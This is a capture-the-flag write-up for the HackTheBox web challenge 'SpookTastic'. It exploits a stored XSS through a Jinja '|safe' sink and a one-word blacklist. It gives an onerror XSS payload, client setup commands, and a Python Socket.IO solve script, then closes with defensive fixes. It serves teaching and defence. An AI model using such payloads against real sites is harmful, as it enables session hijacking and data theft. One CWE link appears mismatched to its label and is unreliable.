---
title: "SpookTastic"
date: 2026-10-01 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xss, jinja, socketio, headless-bot, selenium]
description: "A Web challenge where a headless bot renders your input unescaped. Bypass a one-word blacklist with an event-handler XSS, then catch the flag the server pushes back over Socket.IO to a room keyed by your IP."
---

## Overview

`SpookTastic` is a Very Easy HackTheBox **Web** challenge. A Flask + flask-socketio app lets
you "register" an email; a headless Selenium bot then renders every registered email and, if a
JavaScript `alert()` pops in its browser, the server pushes the flag back to you over a
Socket.IO channel. The path is a single [stored XSS](https://cwe.mitre.org/data/definitions/79.html)
through a `|safe` template sink that a near-empty blacklist fails to stop.

## The technique

Two server bugs combine into the vulnerability.

**1. The bot page renders your input unescaped.** The template that the bot visits uses Jinja's
`|safe` filter, which disables HTML escaping:

```html
{% for email in emails %}
    <span>{{ email|safe }}</span><br/>
{% endfor %}
```

So whatever you submit as your "email" is injected as raw HTML into the bot's DOM — a textbook
[stored XSS](https://cwe.mitre.org/data/definitions/79.html) sink.

**2. The blacklist only blocks the literal word `script`.** Registration rejects an email only
if it contains `script` (case-insensitive):

```python
def blacklist_pass(email):
    email = email.lower()
    if "script" in email:
        return False
    return True
```

`<script>` is dead, but every event-handler vector (`onerror`, `onload`, …) sails straight
through.

**The flag is delivered, not printed.** The bot doesn't show the flag anywhere. It waits a few
seconds for an `alert()`; if one appears it accepts it and calls `send_flag(your_ip)`, which
emits a `flag` event **only to Socket.IO clients whose recorded IP equals the IP that
registered** — this is a [headless-bot-as-target](https://cwe.mitre.org/data/definitions/1284.html)
delivery keyed purely on your reused source IP:

```python
def send_flag(user_ip):
    for id, ip in socket_clients.items():
        if ip == user_ip:
            socketio.emit("flag", {"flag": open("flag.txt").read()}, room=id)
```

`socket_clients` is filled on the Socket.IO `connect` event with `request.remote_addr`. So you
must already hold a live Socket.IO connection from the **same source IP** as your HTTP
`/api/register` call. Both go out your one NAT address, so they match automatically.

## Solution

The exploit: open a Socket.IO connection (registering your IP and a `flag` handler), submit an
event-handler XSS that bypasses the blacklist, and read the flag the server pushes back.

The injection only needs to pop `alert()` to satisfy the bot's `alert_is_present` gate — it does
not have to exfil anything itself:

```
<img src=x onerror=alert(1)>
```

**Engine.IO version gotcha.** flask-socketio 5.3.x speaks Engine.IO **v4**. A stock Kali
`python-engineio` (3.x) only speaks v3 and the handshake 400s. Confirm the server's protocol and
install a current client in a venv:

```bash
curl -s 'http://TARGET:PORT/socket.io/?EIO=4&transport=polling'
python3 -m venv venv && ./venv/bin/pip install -U "python-socketio>=5.10" "python-engineio>=4.8" requests
```

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, time, threading, requests, socketio

HOST = sys.argv[1] if len(sys.argv) > 1 else "TARGET:PORT"
BASE = f"http://{HOST}"
PAYLOAD = "<img src=x onerror=alert(1)>"

flag_box = {}
sio = socketio.Client(reconnection=False)

@sio.event
def connect():
    print("[+] socket connected, sid registered to our IP")

@sio.on("flag")
def on_flag(data):
    flag_box["flag"] = data.get("flag")
    print("[+] FLAG:", data.get("flag"))

sio.connect(BASE, transports=["polling", "websocket"])

def register():
    time.sleep(1)
    r = requests.post(f"{BASE}/api/register", json={"email": PAYLOAD}, timeout=10)
    print("[+] register ->", r.status_code, r.text.strip())

threading.Thread(target=register, daemon=True).start()
for _ in range(30):
    if "flag" in flag_box:
        break
    time.sleep(0.5)
sio.disconnect()
```

Run it with the EIO-v4 venv interpreter:

```bash
./venv/bin/python solve.py TARGET:PORT
```

The bot renders the payload, `alert(1)` fires, the server pushes the `flag` event to your room,
and the handler prints `HTB{...}`.

## Why it worked

`|safe` turned user input into live HTML — the most common Jinja XSS sink. The "filter" matched a
single keyword instead of validating structure, so any non-`<script>` JavaScript-execution vector
bypassed it. And the flag channel authorized delivery on a re-used source IP, which your XSS
request and your open socket both share.

## Fix / defense

- Never render user input with `|safe`; let Jinja autoescape, and validate the email against a
  strict format (e.g. `^[^@\s]+@[^@\s]+\.[^@\s]+$`) rather than blacklisting one substring.
- Don't deliver secrets to a browser session based on a re-used source IP — bind delivery to an
  unguessable per-request token.
- Treat any "headless bot that visits attacker-controlled content" as an XSS oracle, and escape
  or sandbox accordingly.
